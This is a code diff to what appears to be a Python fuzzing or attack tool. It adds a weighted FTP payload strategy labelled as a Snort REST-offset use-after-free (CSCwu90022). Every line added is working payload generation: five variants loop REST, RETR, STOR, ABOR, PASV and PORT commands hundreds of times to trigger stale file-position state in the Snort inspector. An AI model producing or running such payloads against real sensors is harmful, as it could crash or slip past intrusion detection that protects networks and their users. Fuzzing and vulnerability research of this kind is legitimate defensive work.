@@ -14,9 +14,10 @@ FTP_STRATEGIES = [
     "rest_overflow",
     "data_channel_confusion",
     "feat_negotiate",
+    "rest_data_reuse",
 ]
 
-FTP_WEIGHTS = [18, 18, 12, 12, 8, 8, 4, 4, 6, 4, 4, 2]
+FTP_WEIGHTS = [18, 18, 12, 12, 8, 8, 4, 4, 6, 4, 4, 2, 10]
 
 FTP_STRATEGY_LABELS = {
     "cmd_overflow":           "CMD Overflow",
@@ -31,6 +32,7 @@ FTP_STRATEGY_LABELS = {
     "rest_overflow":          "REST Overflow",
     "data_channel_confusion": "Data Ch. Confusion",
     "feat_negotiate":         "FEAT Negotiate",
+    "rest_data_reuse":        "REST Offset Reuse UAF (CSCwu90022)",
 }
 
 
@@ -406,6 +408,67 @@ def build_ftp_payload(strategy: str, payload_override=None) -> bytes:
                 lines.append(random.choice(types + modes + strus) + b"\r\n")
                 if random.random() < 0.3:
                     lines.append(b"LIST\r\n")
+            return b"".join(lines)
+
+    elif strategy == "rest_data_reuse":
+        # CSCwu90022: REST command reuse — sets a restart offset, initiates
+        # a transfer, ABORTs, then reuses the same REST offset on a different
+        # data channel mode. Snort's file-position tracker may hold a stale
+        # reference to the aborted channel's state when the offset is reused.
+        variant = random.choice([
+            "rest_abort_reuse", "rest_pasv_port_switch",
+            "rest_multi_channel_race", "rest_offset_accumulate",
+            "rest_concurrent_transfers",
+        ])
+        if variant == "rest_abort_reuse":
+            lines = [preamble]
+            for _ in range(500):
+                offset = str(random.randint(0, 2**32 - 1)).encode()
+                lines.append(b"REST " + offset + b"\r\n")
+                lines.append(b"RETR /data.bin\r\n")
+                lines.append(b"ABOR\r\n")
+                lines.append(b"REST " + offset + b"\r\n")
+                lines.append(b"STOR /upload.bin\r\n")
+                lines.append(b"ABOR\r\n")
+            return b"".join(lines)
+        elif variant == "rest_pasv_port_switch":
+            lines = [preamble]
+            for i in range(500):
+                offset = str((2**31 - 500) + i).encode()
+                lines.append(b"REST " + offset + b"\r\n")
+                if i % 2 == 0:
+                    lines.append(b"PASV\r\n")
+                else:
+                    p1, p2 = random.randint(4, 255), random.randint(1, 255)
+                    lines.append(f"PORT 127,0,0,1,{p1},{p2}\r\n".encode())
+                lines.append(b"RETR /data.bin\r\n")
+                lines.append(b"ABOR\r\n")
+            return b"".join(lines)
+        elif variant == "rest_multi_channel_race":
+            lines = [preamble]
+            for i in range(300):
+                offset = str(random.randint(2**30, 2**31)).encode()
+                lines.append(b"REST " + offset + b"\r\n")
+                lines.append(b"PASV\r\n")
+                lines.append(b"RETR /file1.dat\r\n")
+                lines.append(b"REST " + offset + b"\r\n")
+                lines.append(b"RETR /file2.dat\r\n")
+            return b"".join(lines)
+        elif variant == "rest_offset_accumulate":
+            lines = [preamble]
+            for i in range(1000):
+                lines.append(b"REST " + str(i * 65536).encode() + b"\r\n")
+            lines.append(b"RETR /payload.bin\r\n")
+            return b"".join(lines)
+        else:
+            lines = [preamble]
+            for i in range(200):
+                offset = str(random.randint(0, 2**32 - 1)).encode()
+                lines.append(b"REST " + offset + b"\r\n")
+                lines.append(b"PASV\r\n")
+                lines.append(b"RETR /file_a.dat\r\n")
+                lines.append(b"STOR /file_b.dat\r\n")
+                lines.append(b"ABOR\r\n")
             return b"".join(lines)
 
     else:
